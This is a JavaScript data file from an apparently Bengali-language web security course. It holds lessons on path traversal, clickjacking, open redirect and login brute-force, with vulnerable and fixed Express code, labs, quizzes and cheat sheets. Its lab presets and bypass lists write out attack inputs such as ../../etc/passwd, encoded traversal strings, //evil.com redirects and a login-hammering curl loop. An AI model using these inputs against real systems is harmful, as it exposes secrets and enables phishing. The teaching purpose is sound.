    goals: ['../ sequence কীভাবে folder থেকে বের হয়', 'Encoding bypass', 'Node.js-এ path.resolve ও base-check', 'Nginx alias misconfig'],
    steps: [
      {
        title: 'আক্রমণটা বোঝো',
        body: 'Endpoint: GET /api/download?file=invoice.pdf — server পড়ে /app/uploads/invoice.pdf। Attacker পাঠাল file=../../etc/passwd → server পড়ল /app/uploads/../../etc/passwd = /etc/passwd! একইভাবে .env, SSH key, source code সব পড়া সম্ভব।',
        code: [{ label: 'দুর্বল · Express', lang: 'js', kind: 'bad', text: 'app.get(\'/download\', (req, res) => {\n  res.sendFile(\'/app/uploads/\' + req.query.file);\n});' }],
      },
      {
        title: 'Bypass কৌশল',
        body: 'শুধু "../" string বাদ দিলে কাজ হয় না:',
        points: ['URL encode: %2e%2e%2f', 'Double encode: %252e%252e%252f', '....// (একবার ../ সরালে ../ থেকে যায়)', 'Absolute path: /etc/passwd', 'Windows: ..\\..\\'],
      },
      {
        title: 'সমাধান',
        body: 'Path normalize করো, তারপর যাচাই করো ফলাফল এখনো base directory-র ভেতরে আছে কিনা। আরও ভালো: user থেকে filename নিও না — ID নাও, DB থেকে path বের করো।',
        code: [{ label: 'নিরাপদ · Node.js', lang: 'js', kind: 'good', text: 'import path from \'node:path\';\n\nconst base = \'/app/uploads\';\nconst name = path.basename(String(req.query.file));   // শুধু ফাইলের নাম\nconst full = path.resolve(base, name);\nif (!full.startsWith(base + path.sep)) return res.sendStatus(400);\nres.sendFile(full);\n\n// Express-এর সহজ উপায়: res.sendFile(name, { root: base }) — root-এর বাইরে যেতে দেয় না' }],
        tip: 'Nginx: "location /files { alias /data/files/; }" — location-এ trailing slash না থাকলে /files../ দিয়ে parent folder পড়া যায় (alias traversal)।',
      },
    ],
    labs: [
      {
        type: 'request',
        title: 'Path Traversal Lab',
        intro: '/api/download?file= দিয়ে /app/uploads থেকে ফাইল নামানো যায়। Server-এর গোপন ফাইল পড়ার চেষ্টা করো।',
        server: 'files.shop.local',
        secureLabel: 'filepath.Clean + base check',
        presets: [
          { name: 'আমার invoice', req: { method: 'GET', path: '/api/download?file=invoice-1001.pdf', headers: 'Authorization: Bearer token_rahim_u7', body: '' } },
          { name: '../ চেষ্টা', req: { method: 'GET', path: '/api/download?file=../../etc/passwd', headers: 'Authorization: Bearer token_rahim_u7', body: '' } },
        ],
        handler: 'traversalApi',
        tasks: [
          { id: 'ok', text: 'নিজের invoice ডাউনলোড করো' },
          { id: 'passwd', text: '/etc/passwd পড়ো' },
          { id: 'env', text: 'App-এর .env ফাইল পড়ো (app root: /app)' },
          { id: 'fixed', text: 'Secure mode-এ encoded payload (%2e%2e%2f) চেষ্টা করে 400 পাও' },
        ],
      },
    ],
    quiz: [
      { q: '/app/uploads/../../etc/passwd resolve হলে কোথায় যায়?', options: ['/app/uploads/etc/passwd', '/etc/passwd', '/app/etc/passwd', 'Error'], answer: 1, explain: 'দুইবার উপরে → root।' },
      { q: 'শুধু "../" replace করলে কেন যথেষ্ট নয়?', options: ['Encoding ও ....// bypass', 'JavaScript-এ replace কাজ করে না', 'ধীর', 'যথেষ্ট'], answer: 0, explain: 'Normalize করে base check করো।' },
      { q: 'সবচেয়ে নিরাপদ design কী?', options: ['User থেকে full path নেওয়া', 'File ID নিয়ে DB থেকে path', 'Regex দিয়ে ../ সরানো', 'Base64 filename'], answer: 1, explain: 'User path নিয়ন্ত্রণই করে না।' },
    ],
    cheat: {
      category: 'Web Attacks', severity: 'high',
      summary: '../ দিয়ে নির্ধারিত folder থেকে বের হয়ে server-এর যেকোনো ফাইল পড়া।',
      rules: ['User থেকে path নয় — ID নাও', 'filepath.Base + Join + prefix check', 'Express: res.sendFile(name, { root })', 'App user-এর file permission সীমিত', 'Nginx alias-এ trailing slash মেলাও'],
      checklist: ['../../etc/passwd, %2e%2e%2f, ....// test', 'File serve করা সব endpoint তালিকা'],
      remember: 'Normalize করো, তারপর base-এর ভেতরে কিনা যাচাই।',
    },
  },

  {
    id: 'clickjack',
    phase: 2,
    no: '13',
    icon: '🖱️',
    title: 'Clickjacking',
    subtitle: 'অদৃশ্য iframe-এ ক্লিক চুরি',
    duration: '২০ মিনিট',
    goals: ['UI redressing কীভাবে হয়', 'X-Frame-Options ও CSP frame-ancestors', 'কোন page-এ বেশি ঝুঁকি'],
    steps: [
      {
        title: 'আক্রমণটা বোঝো',
        body: 'Attacker তার page-এ তোমার site-কে একটি অদৃশ্য (opacity: 0) iframe-এ লোড করে, আর উপরে একটি লোভনীয় button রাখে: "🎁 পুরস্কার নাও"। তুমি যেখানে ক্লিক করো, ঠিক তার নিচে তোমার site-এর "Delete account" বা "Transfer" button। তুমি logged in, তাই ক্লিক সত্যিই কাজ করে।',
      },
      {
        title: 'সমাধান',
        body: 'Browser-কে বলে দাও তোমার page অন্য site-এর iframe-এ লোড হবে না:',
        code: [
          { label: 'HTTP header', lang: 'http', kind: 'good', text: "Content-Security-Policy: frame-ancestors 'none'\nX-Frame-Options: DENY" },
          { label: 'Nginx', lang: 'nginx', kind: 'good', text: 'add_header X-Frame-Options "DENY" always;\nadd_header Content-Security-Policy "frame-ancestors \'none\'" always;' },
        ],
        points: ['frame-ancestors আধুনিক মান, X-Frame-Options পুরনো browser-এর জন্য', 'নিজের domain-এ embed দরকার হলে: frame-ancestors \'self\'', 'গুরুত্বপূর্ণ action-এ confirmation dialog'],
      },
    ],
    labs: [{ type: 'clickjack', title: 'Clickjacking Visualizer', intro: 'Slider দিয়ে অদৃশ্য iframe-এর opacity বাড়িয়ে দেখো আসলে কী হচ্ছে। তারপর header চালু করে আক্রমণ ব্যর্থ করো।' }],
    quiz: [
      { q: 'Clickjacking কোন header দিয়ে আটকানো যায়?', options: ['CSP frame-ancestors', 'HSTS', 'CORS', 'Cache-Control'], answer: 0, explain: 'X-Frame-Options-ও কাজ করে।' },
      { q: 'Clickjacking-এ iframe সাধারণত কেমন থাকে?', options: ['বড় ও উজ্জ্বল', 'অদৃশ্য (opacity 0)', 'লাল রঙের', 'Popup'], answer: 1, explain: 'User বুঝতেই পারে না।' },
    ],
    cheat: {
      category: 'Web Attacks', severity: 'medium',
      summary: 'অদৃশ্য iframe-এ তোমার site, উপরে ভুয়া button — user-এর ক্লিক চুরি।',
      rules: ["CSP: frame-ancestors 'none' (বা 'self')", 'X-Frame-Options: DENY', 'গুরুত্বপূর্ণ action-এ confirm'],
      checklist: ['<iframe src="https://yoursite"> দিয়ে test', 'securityheaders.com'],
      remember: 'তোমার page অন্যের frame-এ নয়।',
    },
  },

  {
    id: 'redirect',
    phase: 2,
    no: '14',
    icon: '↪️',
    title: 'Open Redirect',
    subtitle: 'বিশ্বস্ত domain দিয়ে phishing',
    duration: '২০ মিনিট',
    goals: ['?next= / ?redirect= parameter-এর ঝুঁকি', 'Phishing ও OAuth token চুরি', 'Relative path ও allowlist'],
    steps: [
      {
        title: 'আক্রমণটা বোঝো',
        body: 'Login-এর পরে user-কে আগের page-এ ফেরাতে: /login?next=/dashboard। যদি server যেকোনো URL-এ redirect করে, attacker পাঠায়: https://bank.example/login?next=https://bank-example.evil/ — link দেখতে আসল bank-এর, কিন্তু login-এর পর user যায় ভুয়া site-এ যা বলে "পাসওয়ার্ড ভুল, আবার দিন"।',
        points: ['Phishing বিশ্বাসযোগ্য করে', 'OAuth redirect_uri-তে থাকলে authorization code / token চুরি', 'SSRF filter bypass-এ ব্যবহার'],
      },
      {
        title: 'Bypass কৌশল',
        body: 'শুধু "starts with /" চেক করলে: //evil.com (protocol-relative), /\\evil.com, /%2F%2Fevil.com। "contains bank.example" চেক করলে: bank.example.evil.com।',
      },
      {
        title: 'সমাধান',
        body: '',
        code: [{ label: 'নিরাপদ · Express', lang: 'js', kind: 'good', text: 'let next = String(req.query.next || \'\');\nconst safe = next.startsWith(\'/\') && !next.startsWith(\'//\') && !next.includes(\'\\\\\');\nif (!safe) next = \'/dashboard\';\nres.redirect(next);' }],
        points: ['শুধু relative path (/ দিয়ে শুরু, // নয়)', 'অথবা named destination: ?next=orders → map থেকে path', 'External হলে allowlist + "আপনি বাইরে যাচ্ছেন" page'],
      },
    ],
    labs: [
      {
        type: 'request',
        title: 'Open Redirect Lab',
        intro: '/login/callback?next= login-এর পরে redirect করে। Attacker domain-এ redirect করাও, তারপর Secure Mode-এ bypass চেষ্টা করো।',
        server: 'bank.example',
        secureLabel: 'শুধু safe relative path',
        presets: [
          { name: 'Normal', req: { method: 'GET', path: '/login/callback?next=/dashboard', headers: 'Cookie: session=valid', body: '' } },
          { name: 'Evil redirect', req: { method: 'GET', path: '/login/callback?next=https://bank-example.evil/login', headers: 'Cookie: session=valid', body: '' } },
          { name: 'Protocol-relative', req: { method: 'GET', path: '/login/callback?next=//evil.com', headers: 'Cookie: session=valid', body: '' } },
        ],
        handler: 'redirectApi',
        tasks: [
          { id: 'ok', text: '/dashboard-এ সাধারণ redirect' },
          { id: 'evil', text: 'Vulnerable mode-এ external evil domain-এ redirect' },
          { id: 'fixed', text: 'Secure mode-এ //evil.com চেষ্টা করে /dashboard-এ fallback দেখো' },
        ],
      },
    ],
    quiz: [
      { q: '//evil.com কী ধরনের URL?', options: ['Relative path', 'Protocol-relative (external)', 'File path', 'Invalid'], answer: 1, explain: 'Browser এটাকে https://evil.com ধরে।' },
      { q: 'Open redirect-এর প্রধান ব্যবহার?', options: ['Phishing বিশ্বাসযোগ্য করা', 'DB dump', 'DDoS', 'Cache poisoning'], answer: 0, explain: 'বিশ্বস্ত domain দিয়ে শুরু হয়।' },
    ],
    cheat: {
      category: 'Web Attacks', severity: 'medium',
      summary: 'Redirect parameter যেকোনো URL নিলে বিশ্বস্ত domain দিয়ে phishing।',
      rules: ['শুধু relative path', '// ও \\ ব্লক', 'Named destination map', 'OAuth redirect_uri exact match'],
      checklist: ['next, redirect, return_to, url parameter খোঁজো', '//evil.com, /\\evil.com test'],
      remember: 'Redirect শুধু নিজের ঘরে।',
    },
  },

  {
    id: 'bruteforce',
    phase: 2,
    no: '15',
    icon: '🔨',
    title: 'Brute-force ও Authentication Attack',
    subtitle: 'Password guessing, credential stuffing',
    duration: '৩০ মিনিট',
    goals: ['Brute-force, dictionary, credential stuffing, password spraying', 'Rate limit, lockout, CAPTCHA-র trade-off', 'bcrypt/argon2', 'User enumeration'],
    steps: [
      {
        title: 'আক্রমণের ধরন',
        body: 'Login form হলো attacker-এর প্রিয় দরজা:',
        points: ['Brute-force — একটি account-এ সব সম্ভাব্য password', 'Dictionary — rockyou.txt-এর মতো জনপ্রিয় password তালিকা', 'Credential stuffing — অন্য site-এর ফাঁস হওয়া email:password জোড়া', 'Password spraying — অনেক account-এ একটি সাধারণ password (Summer2026!) — lockout এড়াতে'],
      },
      {
        title: 'User Enumeration',
        body: '"এই email-এ কোনো account নেই" বনাম "Password ভুল" — এই দুই আলাদা message attacker-কে বলে দেয় কোন email registered। Response time-এর পার্থক্যও (bcrypt শুধু valid user-এ চলে) একই কাজ করে।',
        code: [{ label: 'সঠিক message', lang: 'text', kind: 'good', text: '"Email অথবা password ভুল।"   ← সব ক্ষেত্রে একই\nForgot password: "Account থাকলে আমরা email পাঠিয়েছি।"' }],
      },
      {
        title: 'Rate Limiting (Express)',
        body: 'IP এবং account উভয় ভিত্তিতে limit দাও। Redis দিয়ে store করো যাতে একাধিক instance-এ কাজ করে।',
        code: [{ label: 'Express · express-rate-limit', lang: 'js', kind: 'good', text: 'import rateLimit from \'express-rate-limit\';\n\nconst loginLimiter = rateLimit({\n  windowMs: 60 * 1000,   // ১ মিনিট\n  limit: 5,              // প্রতি IP + email-এ ৫ বার\n  keyGenerator: (req) => req.ip + \':\' + String(req.body.email).toLowerCase(),\n  standardHeaders: true, // RateLimit-* header পাঠাও\n});\n\napp.post(\'/api/login\', loginLimiter, loginHandler);' }],
        warn: 'CDN বা proxy-র (Cloudflare, Nginx) পেছনে থাকলে req.ip দেবে proxy-র IP — সব user-কে একজন মনে হবে! Express-এ app.set("trust proxy", …) দিয়ে শুধু বিশ্বস্ত proxy-কে মানো।',
      },
      {
        title: 'Defense in Depth',
        body: '',
        points: ['Progressive delay / exponential backoff', 'Temporary lockout (স্থায়ী নয় — নইলে attacker ইচ্ছা করে lock করবে)', 'সন্দেহজনক হলে CAPTCHA / Cloudflare Turnstile', 'MFA — password চুরি হলেও রক্ষা', 'bcrypt (cost 12) / argon2id hashing', 'HaveIBeenPwned API দিয়ে breached password ব্লক', 'নতুন device/location থেকে login alert'],
      },
    ],
    labs: [{ type: 'ratelimit', title: 'Brute-force Defense Lab', intro: 'একটি bot তোমার login endpoint-এ password guessing করছে। Defense গুলো চালু করো এবং দেখো attacker-এর সফলতার সম্ভাবনা কীভাবে কমে — আর আসল user-এর অভিজ্ঞতা যেন খারাপ না হয়।' }],
    quiz: [
      { q: 'অনেক account-এ একটি সাধারণ password চেষ্টা করাকে কী বলে?', options: ['Credential stuffing', 'Password spraying', 'Phishing', 'Brute-force'], answer: 1, explain: 'Lockout এড়ানোর কৌশল।' },
      { q: '"এই email registered নয়" message-এর সমস্যা কী?', options: ['কোনো সমস্যা নেই', 'User enumeration', 'XSS', 'CSRF'], answer: 1, explain: 'Attacker valid email তালিকা বানায়।' },
      { q: 'Cloudflare-এর পেছনে Express app-এ আসল client IP পেতে কী লাগবে?', options: ['req.ip যেমন আছে তেমনই যথেষ্ট', 'trust proxy-তে শুধু Cloudflare-এর IP range বসানো', 'X-Real-IP যেকোনো জায়গা থেকে', 'Cookie'], answer: 1, explain: 'নইলে সব user একই IP।' },
    ],
    cheat: {
      category: 'Authentication', severity: 'high',
      summary: 'Login endpoint-এ password guessing — brute-force, stuffing, spraying।',
      rules: ['IP + account rate limit (Redis)', 'Generic error message', 'Temporary lockout + backoff', 'Turnstile/CAPTCHA সন্দেহজনক হলে', 'MFA', 'argon2id / bcrypt(12)', 'Breached password check'],
      checklist: ['Login-এ ১০০ request পাঠিয়ে 429 আসে?', 'Valid/invalid email-এ একই message ও সময়?', 'Proxy-র পেছনে আসল IP?'],
      commands: ['hydra (শুধু নিজের lab)', 'for i in $(seq 20); do curl -s -o /dev/null -w "%{http_code}\\n" -X POST localhost:3000/api/login; done'],
      remember: 'Login endpoint-কে সীমাহীন চেষ্টা দিও না।',
    },
  },
];
